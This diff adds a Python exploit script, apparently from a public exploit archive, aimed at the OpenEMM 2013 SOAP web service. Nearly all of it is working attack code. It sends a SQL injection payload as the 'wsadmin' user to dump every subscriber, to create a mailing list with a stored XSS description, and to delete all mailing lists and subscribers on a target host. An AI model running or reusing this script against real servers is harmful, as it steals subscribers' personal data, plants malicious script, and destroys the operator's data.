@@ -1,0 +1,107 @@
+import os
+import sys
+from SOAPpy import WSDL
+from argparse import ArgumentParser
+from re import sub
+ 
+# Exploit Title: OpenEMM 2013 SQL Injection / Stored XSS
+# Date: 07/20/2013
+# Exploit Author: drone (@dronesec)
+# More information (and required WSDL file):
+#     http://forelsec.blogspot.com/2013/07/openemm-2013-810380hf130066-soap-sql.html
+# Vendor Homepage: http://www.openemm.org/
+# Software Link: https://downloads.sourceforge.net/project/openemm/OpenEMM%20software/OpenEMM%202013/OpenEMM-2013-bin.tar.gz
+# Version: 2013 (8.10.380.hf13.0.066)
+# Tested on: Ubuntu 12.04
+ 
+""" Exploits a host of vulnerabilities discovered in OpenEMM.
+   Required ws.wsdl file should be in local directory.
+"""
+def run(options):
+    """ run exploit
+   """
+    wsdl_file = "./ws.wsdl"
+    sploit = "\\' OR 1=1;-- "
+ 
+    _server = WSDL.Proxy(wsdl_file)
+ 
+    if options.subscribers:
+        # iterate until we get a null response
+        idx = 1
+        while True:
+            ret = _server.getSubscriber("wsadmin", sploit, idx)
+            if ret.paramValues == '':
+                print '[!] Discovered %d subscribers'%(idx-1)
+                break
+ 
+            print ret.paramValues
+            idx += 1
+ 
+    elif options.mlist:
+        try:
+            print '[!] Description field vulnerable to stored xss!'
+            description = raw_input('[!] Enter mlist description: ')
+        except:
+            description = ''
+ 
+        ret = _server.addMailinglist('wsadmin', sploit, options.mlist, description)
+        if ret > 0: print '[!] Saved successfully'
+        else:       print '[!] Save unsuccessful'
+ 
+    elif options.dmlist:
+        print '[!] Deleting all mailing lists...'
+        idx = 1
+        while True:
+            ret = _server.deleteMailinglist('wsadmin', sploit, idx)
+            if ret == 0:
+                print '[!] Deleted %d mailing lists.'%idx
+                break
+            idx += 1
+ 
+    elif options.dsubs:
+        print '[!] Deleting all subscribers...'
+        idx = 1
+        while True:
+            ret = _server.deleteSubscriber('wsadmin', sploit, idx)
+            if ret == 0:
+                print '[!] Deleted %d subscribers.'%idx
+                break
+            idx += 1
+ 
+def parse_args():
+    """ parse args and sub in the desired IP
+   """
+    parser = ArgumentParser()
+    parser.add_argument('-i', help='server address', action='store',
+                dest='host', required=True)
+    parser.add_argument('-s', help='fetch all subscribers', action='store_true',
+                dest='subscribers')
+    parser.add_argument('-m', help='create new mailing list (XSS)', action='store',
+                dest='mlist')
+    parser.add_argument('--dm', help='delete all mailing lists', action='store_true',
+                dest='dmlist')
+    parser.add_argument('--ds', help='delete all subscribers', action='store_true',
+                dest='dsubs')
+ 
+    options = parser.parse_args()
+    try:
+        # sub in server address
+        with open('ws.wsdl', 'r') as f:
+            out = open('tmp.wsdl', 'w+')
+            for line in f:
+                line = sub('location="(.*?)"',
+                    'location="http://{0}:8080/emm_webservice"'.format(options.host),
+                    line)
+                out.write(line)
+            out.close()
+    except IOError:
+        print '[-] ws.wsdl not found'
+        sys.exit(1)
+ 
+    # replace ws.wsdl with temp one
+    os.system('mv tmp.wsdl ws.wsdl')
+    return options
+ 
+if __name__ == "__main__":
+    options = parse_args()
+    run(options)
